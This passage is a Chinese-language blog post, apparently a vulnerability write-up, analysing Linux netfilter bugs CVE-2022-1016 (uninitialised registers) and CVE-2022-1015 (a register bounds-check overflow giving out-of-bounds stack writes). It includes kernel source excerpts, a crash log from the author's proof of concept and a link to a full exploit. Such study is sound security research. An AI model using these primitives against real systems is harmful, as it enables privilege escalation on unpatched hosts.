<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
        
      <meta name="description" content="Boom? PWN ! ! !" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>Dig into Netfilter (二) —— CVE-2022-1015 / CVE-2022-1016 |  北极落小雪</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
  </html>
</html>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
    
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-Dig into Netfilter (2)"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  Dig into Netfilter (二) —— CVE-2022-1015 / CVE-2022-1016
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/Dig%20into%20Netfilter%20(2)/" class="article-date">
  <time datetime="2024-12-01T16:00:00.000Z" itemprop="datePublished">2024-12-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/Kernel/">Kernel</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">4k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">19 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="CVE-2022-1016"><a href="#CVE-2022-1016" class="headerlink" title="CVE-2022-1016"></a>CVE-2022-1016</h3><p> 源码版本为v5.17-rc7.</p>
<p>非常明显且诡异地存在了8年的一个漏洞: 状态机的regs没有初始化.攻击者可以通过该漏洞泄露内核基址.<br>作者的评价:</p>
<blockquote>
<p>I have no idea how this survived for eight and a half years, because to me it stuck out like a sore thumb.</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">nft_do_chain</span><span class="params">(<span class="keyword">struct</span> nft_pktinfo *pkt, <span class="type">void</span> *priv)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span> =</span> priv, *basechain = chain;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_dp</span> *<span class="title">rule</span>, *<span class="title">last_rule</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> nft_net(pkt);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>, *<span class="title">last</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_regs</span> <span class="title">regs</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> stackptr = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_jumpstack</span> <span class="title">jumpstack</span>[<span class="title">NFT_JUMP_STACK_SIZE</span>];</span></span><br><span class="line">	<span class="type">bool</span> genbit = READ_ONCE(net-&gt;nft.gencursor);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span> *<span class="title">blob</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_traceinfo</span> <span class="title">info</span>;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<span id="more"></span>
<h3 id="CVE-2022-1015"><a href="#CVE-2022-1015" class="headerlink" title="CVE-2022-1015"></a>CVE-2022-1015</h3><p>完整EXP及测试环境可在此获取: <a target="_blank" rel="noopener" href="https://github.com/Polaris-Snowfall/kernel_exploit/blob/main/CVE-2022-1015/">CVE-2022-1015</a></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p> 源码版本为v5.17-rc7</p>
<p>在查看了expr的各种类型后, 最吸引人的肯定是nft_payloadxxx了, 因为其具有读写packet的能力.<br>先关注其在构造时的校验.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nft_payload_init</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_ctx *ctx,</span></span><br><span class="line"><span class="params">			    <span class="type">const</span> <span class="keyword">struct</span> nft_expr *expr,</span></span><br><span class="line"><span class="params">			    <span class="type">const</span> <span class="keyword">struct</span> nlattr * <span class="type">const</span> tb[])</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_payload</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line"></span><br><span class="line">	priv-&gt;base   = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_BASE]));</span><br><span class="line">	priv-&gt;offset = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_OFFSET]));</span><br><span class="line">	priv-&gt;len    = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_LEN]));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> nft_parse_register_store(ctx, tb[NFTA_PAYLOAD_DREG],</span><br><span class="line">					&amp;priv-&gt;dreg, <span class="literal">NULL</span>, NFT_DATA_VALUE,</span><br><span class="line">					priv-&gt;len);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">nft_parse_register_store</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_ctx *ctx,</span></span><br><span class="line"><span class="params">			     <span class="type">const</span> <span class="keyword">struct</span> nlattr *attr, u8 *dreg,</span></span><br><span class="line"><span class="params">			     <span class="type">const</span> <span class="keyword">struct</span> nft_data *data,</span></span><br><span class="line"><span class="params">			     <span class="keyword">enum</span> nft_data_types type, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	u32 reg;</span><br><span class="line"></span><br><span class="line">	reg = nft_parse_register(attr);</span><br><span class="line">	err = nft_validate_register_store(ctx, reg, data, type, len);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	*dreg = reg;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">EXPORT_SYMBOL_GPL(nft_parse_register_store);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	nft_parse_register - parse a register value from a netlink attribute</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *	@attr: netlink attribute</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *	Parse and translate a register value from a netlink attribute.</span></span><br><span class="line"><span class="comment"> *	Registers used to be 128 bit wide, these register numbers will be</span></span><br><span class="line"><span class="comment"> *	mapped to the corresponding 32 bit register numbers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">nft_parse_register</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *attr)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> reg;</span><br><span class="line"></span><br><span class="line">	reg = ntohl(nla_get_be32(attr));</span><br><span class="line">	<span class="keyword">switch</span> (reg) {</span><br><span class="line">	<span class="keyword">case</span> NFT_REG_VERDICT...NFT_REG_4:</span><br><span class="line">		<span class="keyword">return</span> reg * NFT_REG_SIZE / NFT_REG32_SIZE;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">EXPORT_SYMBOL_GPL(nft_parse_register);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	nft_validate_register_store - validate an expressions' register store</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *	@ctx: context of the expression performing the load</span></span><br><span class="line"><span class="comment"> * 	@reg: the destination register number</span></span><br><span class="line"><span class="comment"> * 	@data: the data to load</span></span><br><span class="line"><span class="comment"> * 	@type: the data type</span></span><br><span class="line"><span class="comment"> * 	@len: the length of the data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 	Validate that a data load uses the appropriate data type for</span></span><br><span class="line"><span class="comment"> * 	the destination register and the length is within the bounds.</span></span><br><span class="line"><span class="comment"> * 	A value of NULL for the data means that its runtime gathered</span></span><br><span class="line"><span class="comment"> * 	data.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">nft_validate_register_store</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_ctx *ctx,</span></span><br><span class="line"><span class="params">				<span class="keyword">enum</span> nft_registers reg,</span></span><br><span class="line"><span class="params">				<span class="type">const</span> <span class="keyword">struct</span> nft_data *data,</span></span><br><span class="line"><span class="params">				<span class="keyword">enum</span> nft_data_types type, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (reg) {</span><br><span class="line">	<span class="keyword">case</span> NFT_REG_VERDICT:</span><br><span class="line">		<span class="keyword">if</span> (type != NFT_DATA_VERDICT)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (data != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">		    (data-&gt;verdict.code == NFT_GOTO ||</span><br><span class="line">		     data-&gt;verdict.code == NFT_JUMP)) {</span><br><span class="line">			err = nf_tables_check_loops(ctx, data-&gt;verdict.chain);</span><br><span class="line">			<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> err;</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">if</span> (reg &lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (len == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (reg * NFT_REG32_SIZE + len &gt;</span><br><span class="line">		    sizeof_field(<span class="keyword">struct</span> nft_regs, data))</span><br><span class="line">			<span class="keyword">return</span> -ERANGE;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (data != <span class="literal">NULL</span> &amp;&amp; type != NFT_DATA_VALUE)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">EXPORT_SYMBOL_GPL(nft_validate_register_store);</span><br></pre></td></tr></tbody></table></figure>

<p>在这一段代码中出现了经典的check溢出问题.<br>左侧的两个变量reg, len均为用户完全可控.<br>这个溢出可以使得reg超过限制.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (reg &lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (len == <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (reg * NFT_REG32_SIZE + len &gt;</span><br><span class="line">    sizeof_field(<span class="keyword">struct</span> nft_regs, data))</span><br><span class="line">	<span class="keyword">return</span> -ERANGE;</span><br></pre></td></tr></tbody></table></figure>

<p>在求值时, 即可越界写入, regs是nft_do_chains函数的局部变量, 所以这是一个栈上的任意偏移写入原语.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">nft_payload_eval</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_expr *expr,</span></span><br><span class="line"><span class="params">		      <span class="keyword">struct</span> nft_regs *regs,</span></span><br><span class="line"><span class="params">		      <span class="type">const</span> <span class="keyword">struct</span> nft_pktinfo *pkt)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_payload</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span> =</span> pkt-&gt;skb;</span><br><span class="line">	u32 *dest = &amp;regs-&gt;data[priv-&gt;dreg];</span><br></pre></td></tr></tbody></table></figure>
<h4 id="漏洞引入"><a href="#漏洞引入" class="headerlink" title="漏洞引入"></a>漏洞引入</h4><p>笔者最初在分析该漏洞时, 沿用了之前分析时的v5.11源码, 漏洞不影响该版本, 分析两个版本的差异可以知道漏洞是如何被引入的.<br>该版本中的nft_payload_init是这样写的:</p>
<p>这意味着在nft_validate_register_store函数中reg字段并不是用户完全可控的(只取了1字节).</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nft_payload_init</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_ctx *ctx,</span></span><br><span class="line"><span class="params">			    <span class="type">const</span> <span class="keyword">struct</span> nft_expr *expr,</span></span><br><span class="line"><span class="params">			    <span class="type">const</span> <span class="keyword">struct</span> nlattr * <span class="type">const</span> tb[])</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">	priv-&gt;len    = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_LEN]));</span><br><span class="line">	priv-&gt;dreg   = nft_parse_register(tb[NFTA_PAYLOAD_DREG]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> nft_validate_register_store(ctx, priv-&gt;dreg, <span class="literal">NULL</span>,</span><br><span class="line">					   NFT_DATA_VALUE, priv-&gt;len);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在nft_payload结构体中, len和dreg均被指定占8bit的大小.<br>而在转入nft_validate_register_store函数时, 均通过无符号扩展(根据GNU manual, 不含负值的枚举类型是无符号)提升到4字节大小, 从理论上来说, 我们无法在nft_validate_register_store函数中控制dreg和len是一个较大的数来造成溢出.</p>
<blockquote>
<p>Normally, the type is unsigned int if there are no negative values in the enumeration, otherwise int. If -fshort-enums is specified, then if there are negative values it is the first of signed char, short and int that can represent all the values, otherwise it is the first of unsigned char, unsigned short and unsigned int that can represent all the values.</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_payload</span> {</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">nft_payload_bases</span>	<span class="title">base</span>:</span><span class="number">8</span>;</span><br><span class="line">	u8			offset;</span><br><span class="line">	u8			len;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">nft_registers</span>	<span class="title">dreg</span>:</span><span class="number">8</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">nft_validate_register_store</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_ctx *ctx,</span></span><br><span class="line"><span class="params">				<span class="keyword">enum</span> nft_registers reg,</span></span><br><span class="line"><span class="params">				<span class="type">const</span> <span class="keyword">struct</span> nft_data *data,</span></span><br><span class="line"><span class="params">				<span class="keyword">enum</span> nft_data_types type, <span class="type">unsigned</span> <span class="type">int</span> len)</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>如果你不理解我在说什么, 看下面这个demo. </p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%u,%u\n"</span>,a,b);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint8_t</span> a = <span class="number">0xfb</span>;</span><br><span class="line">    <span class="type">int8_t</span> b = <span class="number">0xfb</span>;</span><br><span class="line"></span><br><span class="line">    func(a,b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./a.out    </span><br><span class="line">251,4294967291</span><br></pre></td></tr></tbody></table></figure>
<h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><p>由于漏洞实际存在于nft_parse_register_load和nft_parse_register_store这两个通用的对reg的验证函数中, 所以几乎所有使用reg的expr都可以完成越界.</p>
<p>但为了能调控越界读写的区域位置, 需要对len有一定控制的能力.<br>作者选用了nft_payload和nft_bitwise来进行越界读写.</p>
<p>具体需要读写哪个区域还是得调试发现, 写一个POC运行, 在尝试加载恶意的rule后, 发生了kernel panic.</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">BUG: unable to handle page fault for address: ffffa761803bc828</span><br><span class="line">#PF: supervisor read access in kernel mode</span><br><span class="line">#PF: error_code(0x0000) - not-present page</span><br><span class="line">PGD 101000067 P4D 101000067 PUD 1010dd067 PMD 10208e067 PTE 0</span><br><span class="line">Oops: 0000 [#1] PREEMPT SMP NOPTI</span><br><span class="line">CPU: 0 PID: 75 Comm: exploit Not tainted 5.17.0-rc7 #3</span><br><span class="line">Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.16.3-0-ga6ed6b701f0a-prebuilt.qemu.org 04/01/2014</span><br><span class="line">RIP: 0010:nft_payload_reduce+0xb/0x60</span><br><span class="line">Code: cf 75 a8 85 d2 74 0d 83 fa 03 74 08 48 c7 c0 c0 c3 aa aa c3 48 c7 c0 60 c4 aa aa c3 0f 1f 00 0f b6 46 0b 48 c1 e0 04 48 01 f8 &lt;48&gt; 8b 10 48 85 d2 74 08 48 8b 0e 48 6</span><br><span class="line">RSP: 0018:ffffa761803bb8a8 EFLAGS: 00000286</span><br><span class="line">RAX: ffffa761803bc828 RBX: 0000000000000000 RCX: 0000000000002c01</span><br><span class="line">RDX: ffffffffaa2d2c50 RSI: ffffa2f482178f18 RDI: ffffa761803bb8e8</span><br><span class="line">RBP: ffffa2f482178e50 R08: 0000000000000040 R09: ffffa2f4820fe8a0</span><br><span class="line">R10: 0000000000000004 R11: ffffa2f4812b0c80 R12: ffffa761803bb8e8</span><br><span class="line">R13: ffffa2f482178f18 R14: ffffa2f482178f28 R15: ffffa2f482178e68</span><br><span class="line">FS:  000000000051a3c0(0000) GS:ffffa2f4bbc00000(0000) knlGS:0000000000000000</span><br><span class="line">CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">CR2: ffffa761803bc828 CR3: 00000001011b4000 CR4: 00000000000006f0</span><br><span class="line">Call Trace:</span><br><span class="line"> &lt;TASK&gt;</span><br><span class="line"> nf_tables_commit_chain_prepare+0x243/0x350</span><br><span class="line"> nf_tables_commit+0x13d/0x1060</span><br><span class="line"> ? kmem_cache_alloc_trace+0x3f/0x470</span><br><span class="line"> nfnetlink_rcv_batch+0x32a/0x860</span><br><span class="line"> ? __nla_validate_parse+0x5f/0xc20</span><br><span class="line"> ? netlink_recvmsg+0x2ba/0x380</span><br><span class="line"> ? path_init+0x3a0/0x3e0</span><br><span class="line"> nfnetlink_rcv+0x159/0x180</span><br><span class="line"> netlink_unicast+0x232/0x350</span><br><span class="line"> netlink_sendmsg+0x208/0x440</span><br><span class="line"> __sys_sendto+0x148/0x150</span><br><span class="line"> ? vfs_write+0x1e1/0x280</span><br><span class="line"> __x64_sys_sendto+0x1b/0x20</span><br><span class="line"> do_syscall_64+0x43/0x90</span><br><span class="line"> entry_SYSCALL_64_after_hwframe+0x44/0xae</span><br></pre></td></tr></tbody></table></figure>

<p>定位到了这样一段代码, 当新增rule后, nft会尝试调用expr-&gt;ops-&gt;reduce对rule进行优化, 而在nft_payload_reduce中, 由于我们恶意的dreg值, 这几乎一定导致崩溃. 探索了一会, 并没有发现绕过reduce的方法. 于是下载网上的测试内核, 硬审无符号且大量inline的汇编代码, 发现其的逻辑似乎于笔者编译的内核不同. </p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nf_tables_commit_chain_prepare</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> nft_chain *chain)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">		nft_rule_for_each_expr(expr, last, rule) {</span><br><span class="line">			track.cur = expr;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (expr-&gt;ops-&gt;reduce &amp;&amp;</span><br><span class="line">			    expr-&gt;ops-&gt;reduce(&amp;track, expr)) {</span><br><span class="line">				expr = track.cur;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			}</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (WARN_ON_ONCE(data + expr-&gt;ops-&gt;size &gt; data_boundary))</span><br><span class="line">				<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">memcpy</span>(data + size, expr, expr-&gt;ops-&gt;size);</span><br><span class="line">			size += expr-&gt;ops-&gt;size;</span><br><span class="line">		}</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">}</span><br><span 